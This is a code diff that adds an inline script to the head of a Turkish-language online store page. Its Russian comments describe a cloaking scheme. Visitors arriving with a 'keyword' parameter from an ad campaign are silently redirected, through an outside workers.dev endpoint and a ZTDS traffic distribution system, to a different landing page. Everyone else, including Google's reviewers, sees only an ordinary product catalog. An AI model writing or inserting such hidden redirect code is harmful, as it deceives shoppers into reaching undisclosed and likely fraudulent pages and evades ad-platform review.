@@ -5,6 +5,18 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="description" content="Günlük iyi hâl için ürünlerin doğrudan satışı.">
 <title>Üretici mağazası</title>
+<script>
+// Старый формат ссылок кампаний (как у index.php): корень домена + ?keyword=&geosuffix=&gclid=.
+// Render статику не исполняет, поэтому переброс делает сама страница: весь query уходит в /go
+// воркера, тот спрашивает ZTDS и редиректит на лендинг. Стоит в <head> до стилей — каталог не
+// успевает отрисоваться. Без keyword в адресе ничего не происходит: Google видит обычный каталог.
+(function(){try{
+  var q=location.search; if(!q) return;
+  var p=new URLSearchParams(q);
+  if(!(p.get('keyword')||p.get('kw'))) return;
+  location.replace('https://pilot-leads.bnsshub.workers.dev/go'+q);
+}catch(e){}})();
+</script>
 <link rel="icon" type="image/png" href="favicon.png">
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
